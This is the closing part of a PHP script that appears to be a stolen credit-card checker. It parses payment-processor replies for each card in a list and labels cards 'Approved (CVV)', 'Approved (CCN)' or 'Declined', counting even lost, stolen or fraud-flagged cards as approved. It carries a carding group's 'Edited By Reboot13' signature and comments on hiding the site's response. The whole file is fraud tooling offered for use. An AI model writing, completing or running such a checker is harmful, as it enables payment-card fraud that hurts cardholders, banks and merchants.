    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - Incorrect Zip)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - Incorrect Zip_𝕽𝖊𝖇𝖔𝖔𝖙 ♛)」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Success" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "succeeded." )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Fraudulent Card_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Insufficient Funds_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Insufficient Funds_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Lost Card_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Incorrect Card Number_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Incorrect Card Number_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "service_not_allowed")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Service Not Allowed_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Unavailable_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Proxy Error_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Missing Card Details_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"lock_timeout")){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Another Request In Process : Card Not Checked_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「3D Secure Redirect_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"missing_payment_information")){
     '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Payment Informations_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Credit Card Number_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dead Proxy/Error Not listed_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

  curl_close($curl);
  ob_flush();
  //////=========Comment Echo $result If U Want To Hide Site Side Response
  echo $result;

///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\\\\\\\\\\\

?>
